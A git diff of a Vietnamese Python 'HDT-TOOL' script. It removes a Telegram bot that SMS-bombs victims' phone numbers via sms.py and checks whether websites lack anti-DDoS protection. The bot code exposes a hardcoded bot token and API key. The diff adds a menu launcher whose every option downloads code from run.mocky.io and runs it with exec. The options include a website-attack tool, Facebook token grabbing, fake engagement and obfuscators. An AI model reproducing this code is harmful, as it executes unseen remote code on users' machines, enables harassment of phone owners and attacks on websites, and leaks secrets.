@@ -1,13 +1,109 @@
-import telebot
-import datetime
-import time
-import os,sys,re
-import subprocess
-import requests
-from telegram import Update
-from telegram.ext import Updater, CommandHandler, CallbackContext
-import requests
+from builtins import all,exec,format,id,print,int,range,set,str,open,quit
+exec('')
+import os
+try:
+	import requests,colorama,prettytable
+except:
+	os.system('pip install requests')
+	os.system('pip install colorama')
+	os.system('pip install prettytable')
+import threading,requests,ctypes,random,json,time,base64,sys,re
+from prettytable import PrettyTable
+import random
+from time import strftime
+from colorama import init,Fore
+from urllib.parse import urlparse,unquote,quote
+from string import ascii_letters,digits
 from bs4 import BeautifulSoup
+from datetime import datetime
+import re,requests,os,sys
+from time import sleep 
+from datetime import date
+import requests, random
+import requests
+import base64, json,os
+from datetime import date
+from datetime import datetime
+from time import sleep,strftime
+from bs4 import BeautifulSoup
+from datetime import datetime
+import re,requests,os,sys
+from time import sleep 
+from datetime import date
+import requests, random
+import uuid, re
+from pystyle import Write,Colors
+from bs4 import BeautifulSoup
+import socket
+from datetime import datetime
+time=datetime.now().strftime("%H:%M:%S")
+from pystyle import *
+data_machine = []
+today = date.today()
+now = datetime.now()
+thu = now.strftime("%A")
+ngay_hom_nay = now.strftime("%d")
+thang_nay = now.strftime("%m")
+nam_ = now.strftime("%Y")
+#IP
+def get_ip_from_url(url):
+    response = requests.get(url)
+    ip_address = socket.gethostbyname(response.text.strip())
+    return ip_address
+url = "http://kiemtraip.com/raw.php"
+ip = get_ip_from_url(url)
+import os,sys
+import requests,json
+from time import sleep
+from datetime import datetime, timedelta
+import base64,requests,os
+#màu
+xnhac = "\033[1;36m"
+do = "\033[1;31m"
+luc = "\033[1;32m"
+vang = "\033[1;33m"
+xduong = "\033[1;34m"
+hong = "\033[1;35m"
+trang = "\033[1;37m"
+whiteb="\033[1;37m"
+red="\033[0;31m"
+redb="\033[1;31m"
+end='\033[0m'
+#đánh dấu bản quyền
+edit = vang+"]"+trang+"["+do+"[⟨⟩]"+trang+"]"+vang+"["+trang+" ➩ "+luc
+edit1 = trang+"["+do+"[⟨⟩]"+trang+"]"+trang+" ➩ "+luc
+# =======================[ NHẬP KEY ]=======================
+ngay = int(strftime('%d'))
+key1 = str(ngay * 8276383 + 93732373)
+key = 'HDT-' + key1
+if not os.path.exists('HDT_TOOL.txt'):
+    os.system("cls" if os.name == "nt" else "clear")    
+    print("\033[1;33mTool Free Nên Sẽ Đổi Key Mỗi Ngày\033[1;33m")
+    print("\033[1;33mHãy Vào Bot Telegram Để Lấy Key \n(Link box: https://t.me/keyhdttool)\033[1;33m")
+    print("\033[1;35m ============================================  ")
+    print('\033[1;36mHãy Vào Bot Telegram Để Lấy Key')
+    keynhap = input('\033[1;34mKey Đã Lấy Là: \033[1;33m')
+    with open('HDT_TOOL.txt', 'w') as f:
+        f.write(keynhap)
+with open('HDT_TOOL.txt', 'r') as f:
+    keynhap = f.read()
+os.system("cls" if os.name == "nt" else "clear")        
+if keynhap == key:
+    nhap = ("""\033[1;36m>\033[1;31m>\033[1;37m> \033[1;32mKey Đúng Và Đã Được Lưu 
+\033[1;31m➩\033[1;32m Chúc Bạn Chạy Tool Vui Vẻ \033[1;35.....""")
+    for i in nhap:
+        sys.stdout.write(i)
+        sys.stdout.flush()
+else:
+    print('\033[1;37mKey Sai Hoặc Đã Hết Hạn Vui Lòng Khởi Động Lại Tool Và Vượt Link Lại \033[1;31m!!!\n')
+    os.remove('HDT_TOOL.txt')
+    quit()
+import os, sys, requests
+from time import sleep
+from pystyle import *
+from time import strftime
+from datetime import datetime, timedelta
+now=datetime.now()
 os.system("cls" if os.name == "nt" else "clear")
 banner="""
 \033[1;34m╔═════════════════════════════════════════════════════════════════╗
@@ -24,166 +120,143 @@ banner="""
 \033[1;33m║➣ Website  : https://hdt-tool.blogspot.com                       ║
 \033[1;32m║➣ Nhóm Telegram : https://t.me/hdttool                           ║
 \033[1;34m╚═════════════════════════════════════════════════════════════════╝
-\033[1;32m ➣ ➣ ➣ ➣ ➣ ➣ \033[1;33mĐang Chạy Bot Telegram \033[1;32m➣ ➣ ➣ ➣ ➣ ➣
 """
 for X in banner:
   sys.stdout.write(X)
   sys.stdout.flush() 
-bot_token = '6662966519:AAFTg0JObjY7f80dqqFaDIaqt2c1duXRu5c' 
-bot = telebot.TeleBot(bot_token)
-processes = []
-ADMIN_ID = '5668021745'
-allowed_group_id = -1001672505750
-def TimeStamp():
-    now = str(datetime.date.today())
-    return now
-
-@bot.message_handler(commands=['getkey'])
-def startkey(message):
-    bot.reply_to(message, text='VUI LÒNG ĐỢI TRONG GIÂY LÁT!')
-    key = "HDT-" + str(int(message.from_user.id) * int(datetime.date.today().day) - 12666)
-    key = "html-css-js.hdt-tool.repl.co?key=" + key
-    print(key)
-    api_token = '64dede03981c99475d22f97f'
-    url = requests.get(f'https://link4m.co/api-shorten/v2?api={api_token}&url={key}').json()
-    url_key = url['shortenedUrl']
-    text = f'''- https://hdttool2023.000webhostapp.com/+.mp4
-- LINK LẤY KEY {TimeStamp()} LÀ: {url_key}
-- KHI LẤY KEY XONG, DÙNG LỆNH /key <key> ĐỂ TIẾP TỤC
-'''
-    bot.reply_to(message, text)
-
-
-@bot.message_handler(commands=['key'])
-def key(message):
-    if len(message.text.split()) == 1:
-        bot.reply_to(message, 'VUI LÒNG NHẬP KEY.')
-        return
-
-    user_id = message.from_user.id
-
-    key = message.text.split()[1]
-    username = message.from_user.username
-    expected_key = "HDT-" + str(int(message.from_user.id) * int(datetime.date.today().day) - 12666)
-    if key == expected_key:
-        bot.reply_to(message, f' [ KEY HỢP LỆ ] NGƯỜI DÙNG CÓ ID: [ {user_id} ] ĐƯỢC PHÉP ĐƯỢC SỬ DỤNG LỆNH    [ /spam ]')
-        fi = open(f'./user/{datetime.date.today().day}/{user_id}.txt',"w")
-        fi.write("")
-        fi.close()
-    else:
-        bot.reply_to(message, 'KEY KHÔNG HỢP LỆ.')
-  
-@bot.message_handler(commands=['spam'])
-def spam(message):
-    user_id = message.from_user.id
-    if not os.path.exists(f"./user/{datetime.date.today().day}/{user_id}.txt"):
-      bot.reply_to(message, 'Dùng /getkey Để Lấy Key Và Dùng /key Để Nhập Key Hôm Nay!')
-      return
-    if len(message.text.split()) == 1:
-        bot.reply_to(message, 'VUI LÒNG NHẬP SỐ ĐIỆN THOẠI ')
-        return
-    if len(message.text.split()) == 2:
-        bot.reply_to(message, 'Vui Lòng Nhập Đúng Định Dạng | Ví Dụ: /spam 0987654321 50')
-        return
-    lap = message.text.split()[2]
-    if lap.isnumeric():
-      if not (int(lap) > 0 and int(lap) <= 50):
-        bot.reply_to(message,"Vui Lòng Spam Trong Khoảng 1 - 50 Thôi !!")
-        return
-    else:
-      bot.reply_to(message,"Sai Số Lần Spam !!!")
-      return
-    phone_number = message.text.split()[1]
-    if not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",phone_number):
-        bot.reply_to(message, 'SỐ ĐIỆN THOẠI KHÔNG HỢP LỆ !')
-        return
-
-    if phone_number in ["0365956335"]:
-        # Số điện thoại nằm trong danh sách cấm
-        bot.reply_to(message,"Spam cái đầu buồi tao huhu")
-        return
-    file_path = os.path.join(os.getcwd(), "sms.py")
-    process = subprocess.Popen(["python", file_path, phone_number, lap])
-    processes.append(process)
-    bot.reply_to(message, f'➤ ID Của Bạn Là: [ {user_id} ]\n➤ Tấn Công SĐT: [ {phone_number} ]Thành Công ✅\n➤ Lặp Lại : {lap} ⏰\n➤ Ngày : {TimeStamp()}\n➤ Chủ Bot : 𝐇𝐃𝐓-𝐓𝐎𝐎𝐋\n https://hdttool2023.000webhostapp.com/_.mp4\n')
-@bot.message_handler(commands=['help'])
-def help(message):
-    help_text = '''
-Danh sách lệnh:
-┏━━━━━━━━━━━━━━━━━┓
-┣➤/getkey: Để Lấy Key ✅
-┣➤/key: Để Nhập Key ✅
-┣➤/spam {SĐT} {Số Lần} ✅
-┣➤/check + [host] : Kiểm Tra AntiDDoS ✅
-┣➤/help: Danh sách lệnh ✅
-┣➤/time Thời Gian HĐ Bot ✅
-┣➤/status Lượt Chạy Bot ✅
-┣➤/admin Thông Tin Admin ✅
-┗━━━━━━━━━━━━━━━━━┛
-'''
-    bot.reply_to(message, help_text)
-    
-# status
-@bot.message_handler(commands=['status'])
-def status(message):
-    user_id = message.from_user.id
-    if str(user_id) != ADMIN_ID:
-        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
-        return
-    process_count = len(processes)
-    bot.reply_to(message, f'Số quy trình đang chạy: {process_count}.')
-#cpu
-# khoir dong lai bot
-@bot.message_handler(commands=['time'])
-def show_uptime(message):
-    current_time = time.time()
-    uptime = current_time
-    hours = int(uptime // 3600)
-    minutes = int((uptime % 3600) // 60)
-    seconds = int(uptime % 60)
-    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {hours} giờ, {minutes} phút, {seconds} giây')
-#check
-@bot.message_handler(commands=['check'])
-def check_ip(message):
-    if len(message.text.split()) != 2:
-        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /check + [link website]')
-        return
-
-    url = message.text.split()[1]
-    
-    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
-    if not url.startswith(("http://", "https://")):
-        url = "http://" + url
-
-    # Loại bỏ tiền tố "www" nếu có
-    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
-    
-    try:
-        ip_list = socket.gethostbyname_ex(url)[2]
-        ip_count = len(ip_list)
-
-        reply = f"Ip của website: {url}\nLà: {', '.join(ip_list)}\n"
-        if ip_count == 1:
-            reply += "Website có 1 ip có khả năng không antiddos."
-        else:
-            reply += "Website có nhiều hơn 1 ip khả năng antiddos rất cao.\nKhông thể tấn công website này."
-
-        bot.reply_to(message, reply)
-    except Exception as e:
-        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
-#admin
-@bot.message_handler(commands=['admin'])
-def admin_info(message):
-    # Thay thế các giá trị sau bằng thông tin liên hệ của bạn
-    telegram_url = "https://t.me/llll0l0llll"
-    zalo_box = "https://zalo.me/g/bprmyn080"
-    youtube_url = "https://youtube.com/@HDT-TOOL"
-    web_url = "https://hdt-tool.blogspot.com"
-    admin_message = f"Thông tin liên hệ của Admin:\n\ntelegram: {telegram_url}\nBox Zalo: {zalo_box}\nweb: {web_url}\nyoutube: {youtube_url}"
-    bot.reply_to(message, admin_message)
-# lo 
-@bot.message_handler(func=lambda message: True)
-def echo_all(message):
-    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')
-
-bot.infinity_polling(timeout=60, long_polling_timeout = 1)
+  sleep(0.00)
+print(f"{trang} ➩ Ngày{trang} : {do}{ngay_hom_nay}{vang} |{luc} Tháng{trang}: {do}{thang_nay} {vang}| {luc}Năm{trang}: {do}{nam_}{vang} | {luc}Thời Gian: {do}{time}")
+print(f'{trang} ➩ IP Hiện Tại Của Bạn : {vang}{ip}')
+print("\033[1;34m⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦")
+print("\033[1;33m╔═════════════════════╗")
+print("\033[1;33m║ \033[1;34mTOOL Trao Đổi Sub \033[1;33m  ║ ")
+print("\033[1;33m╚═════════════════════╝")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[1] \033[1;32mTDS TIKTOK + TIKTOK NOW")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[2] \033[1;32mTDS BẰNG PAGE PRO5 [1]")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[3] \033[1;32mTDS FACEBOOK FULL JOD")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[4] \033[1;32mTDS BẰNG PAGE PRO5 Đa Luồng [2]")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[5] \033[1;32mTDS INSTAGRAM MAX SPEED")
+print("\033[1;33m╔═════════════════════╗ ")
+print("\033[1;33m║ \033[1;34mTOOL Tương Tác Chéo \033[1;33m║ ")
+print("\033[1;33m╚═════════════════════╝ ")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[6] \033[1;32mTTC PAGE PRO5 [1]")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[7] \033[1;32mTTC INSTAGRAM VIPIG")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[8] \033[1;32mTTC PAGE PRO5 [2] ")
+print("\033[1;33m╔═════════════════════╗ ")
+print("\033[1;33m║ \033[1;34mTOOL TIỆN ÍCH PRO5 \033[1;33m ║ ")
+print("\033[1;33m╚═════════════════════╝ ")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[9] \033[1;32mBUFF CẢM XÚC STORY BẰNG PRO5")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[10] \033[1;32mBUFF VIEW STORY BẰNG PRO5")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[11] \033[1;32mKÍCH HOẠT PAGE PRO5")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[12] \033[1;32mBUFF FOLOW BẰNG PAGE PRO5")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[13] \033[1;32mCHUYỂN QUYỀN QTV PRO5")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[14] \033[1;32mBUFF TV NHÓM BẰNG PAGE PRO5")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[15] \033[1;32mREG PAGE PRO5 + ÚP ĐẠI DIỆN")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[16] \033[1;32mSHARE ẢO BẰNG PRO5 [TOKEN]")
+print("\033[1;33m╔══════════════════════╗ ")
+print("\033[1;33m║ \033[1;34mTOOL ENCODE + DECODE \033[1;33m║ ")
+print("\033[1;33m╚══════════════════════╝ ")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[17] \033[1;32mENCODE - Độc Quyền HDT-TOOL")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[18] \033[1;32mENCODE - INPOSTOR")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[19] \033[1;32mENCODE - 5 LỚP")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[20] \033[1;32mENCODE - MARSHAL 16 CHẾ ĐỘ")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[21] \033[1;32mENCODE - Emoji 4 Chế Độ")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[22] \033[1;32mENCODE - MARSHAL")
+print("\033[1;33m╔══════════════════════╗ ")
+print("\033[1;33m║ \033[1;34mTOOL TIỆN ÍCH KHÁC   \033[1;33m║ ")
+print("\033[1;33m╚══════════════════════╝ ")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[23] \033[1;32mKẾT BẠN FACEBOOK GỢI Ý")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[24] \033[1;32mNUÔI NICK FACEBOOK")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[25] \033[1;32mGET TOKEN FACEBOOK")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[26] \033[1;32mTOOL LỌC PROXY")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[27] \033[1;32mTOOL TẤN CÔNG WEBSITE \033[1;33m[ NEW ]")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[28] \033[1;32mTOOL NUÔI NICK FACEBOOK")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[30] \033[1;32mTOOL SHARE ẢO PRO5 [ MAX SPEED ]")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[31] \033[1;32mREG ACC GARENA")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[32] \033[1;32mGET TOKEN PAGE PRO5")
+print("\033[1;33m╔══════════════════════╗ ")
+print("\033[1;33m║ \033[1;34mGOLIKE ▶ VIEW TIKTOK\033[1;33m ║ ")
+print("\033[1;33m╚══════════════════════╝ ")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[33] \033[1;32mTOOL GOLIKE V1")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[34] \033[1;32mTOOL GOLIKE V2")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[36] \033[1;32mTOOL BUFF VIEW TIKTOK \033[1;31m[ Chưa Dùng Được ]")
+print("\033[1;31m ▶ Nhập Số \033[1;36m[37] \033[1;32mTOOL BUFF CMT BÀI VIẾT FB \033[1;33m[ NEW ]")
+print("\033[1;34m⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦")
+chon = int(input('\033[1;31m ▶ Nhập Số \033[1;32m: \033[1;33m'))
+if chon == 1 :
+	exec(requests.get('https://run.mocky.io/v3/8221ea33-c46a-45e1-bb2c-94b057cd89a5').text)
+if chon == 2 :
+	exec(requests.get('https://run.mocky.io/v3/c3abc6b6-5e02-42de-9b3b-f9496b97dd00').text)
+if chon == 3 :
+	exec(requests.get('https://run.mocky.io/v3/f7a6abc2-1d8e-4c3c-9f77-88e3f6f73c91').text)
+if chon == 4 :
+	exec(requests.get('https://run.mocky.io/v3/d398d205-ee9e-41c4-957e-9897b910fe3f').text)
+if chon == 5 :
+ exec(requests.get('https://run.mocky.io/v3/33ac725c-ee55-48c3-8624-c30f943e3abf').text)
+if chon == 6 :
+	exec(requests.get('https://run.mocky.io/v3/570fc93b-7e82-468a-b81c-8177e370d486').text)
+if chon == 7 :
+	exec(requests.get('https://run.mocky.io/v3/b09d1365-c10c-4c6a-8d01-ae53a9666c1a').text)
+if chon == 8 :
+	exec(requests.get('https://run.mocky.io/v3/11ab0ee0-2345-4ef4-bc7e-11c253bb5292').text)
+if chon == 9 :
+	exec(requests.get('https://run.mocky.io/v3/6ed8107c-f203-490d-868a-6c7e6a6a9c13').text)
+if chon == 10 :
+	exec(requests.get('https://run.mocky.io/v3/36486b40-c74d-4891-bf67-d853cf2b406e').text)
+if chon == 11 :
+	exec(requests.get('https://run.mocky.io/v3/3464ef7c-c98d-4ac9-acce-4081983794d2').text)
+if chon == 12 :
+	exec(requests.get('https://run.mocky.io/v3/48b4f5ad-02a1-4428-a1d8-0642bc1074dc').text)
+if chon == 13 :
+	exec(requests.get('https://run.mocky.io/v3/a6314cc6-c342-4cc0-ab76-93c4d160140e').text)
+if chon == 14 :
+	exec(requests.get('https://run.mocky.io/v3/58ff6704-4fd4-46b2-aa7d-cd3f647b47e9').text)
+if chon == 15 :
+ exec(requests.get('https://run.mocky.io/v3/c75f2097-e07c-4688-95ed-e5b4377cfbb4').text)
+if chon == 16 :
+ exec(requests.get('https://run.mocky.io/v3/f848f336-d6f1-4866-bea2-d99315330770').text)
+if chon == 17 :
+ exec(requests.get('https://run.mocky.io/v3/97bc5d55-1f06-4e6a-8866-189d294a7971').text)
+if chon == 18 :
+ exec(requests.get('https://run.mocky.io/v3/8a72c023-da9a-4c30-95de-61dcce1c9da3').text)
+if chon == 19 :
+ exec(requests.get('https://run.mocky.io/v3/dc04fadb-0fdd-4b94-be59-a04363a63335').text)
+if chon == 20 :
+ exec(requests.get('https://run.mocky.io/v3/429a3b2d-8762-41da-b139-fdd4f7a544b6').text)
+if chon == 21 :
+ exec(requests.get('https://run.mocky.io/v3/f8c726ba-ed27-41c6-b66d-3c51a118774b').text)
+if chon == 22 :
+ exec(requests.get('https://run.mocky.io/v3/02ca6814-2b44-4e3e-af4e-02a38d5f3a82').text)
+if chon == 23 :
+ exec(requests.get('https://run.mocky.io/v3/8b585ca1-7388-40c5-8199-d8a6c2bc7443').text)
+if chon == 24 :
+ exec(requests.get('https://run.mocky.io/v3/f3b075a8-4983-40a6-b104-56cab87f6dfb').text)
+if chon == 25 :
+ exec(requests.get('https://run.mocky.io/v3/ab9c3051-3e49-4404-9517-a86031dcf738').text)
+if chon == 26 :
+ exec(requests.get('https://run.mocky.io/v3/82fdd44e-cae1-45fc-a00c-93a4f6b1f98c').text)
+if chon == 27 :
+ exec(requests.get('https://run.mocky.io/v3/e3c77030-fcc1-44f0-b22f-99f9364c2518').text)
+if chon == 28 :
+ exec(requests.get('https://run.mocky.io/v3/1dd805d4-adea-4324-a55f-3660bb83ff63').text)
+if chon == 29 :
+ exec(requests.get('chưa').text)
+if chon == 30 :
+ exec(requests.get('https://run.mocky.io/v3/f844c62e-39b5-49a1-a54c-f01dc48c6c3d').text)
+if chon == 31 :
+ exec(requests.get('https://run.mocky.io/v3/1d2fe0c2-9e4b-4125-b6dd-ff400baf052c').text)
+if chon == 32 :
+ exec(requests.get('https://run.mocky.io/v3/883422bb-81a1-4b72-9d67-99a4ef73ddbb').text)
+if chon == 33 :
+ exec(requests.get('https://run.mocky.io/v3/055b055b-5b17-44e0-9382-3333d477d76b').text)
+if chon == 34 :
+ exec(requests.get('https://run.mocky.io/v3/cb93a109-82eb-4746-844c-d1de729e32c0').text)
+if chon == 35 :
+ exec(requests.get('chưa').text)
+if chon == 36 :
+ exec(requests.get('https://run.mocky.io/v3/cdd22615-4233-47bc-bdc9-e84b5c874c52').text)
+if chon == 37 :
+ exec(requests.get('https://run.mocky.io/v3/e804bfc9-d96e-49a7-a0ae-7989d99a3919').text)
+else :
+	print (" Sai Lựa Chọn ")
+	exit()
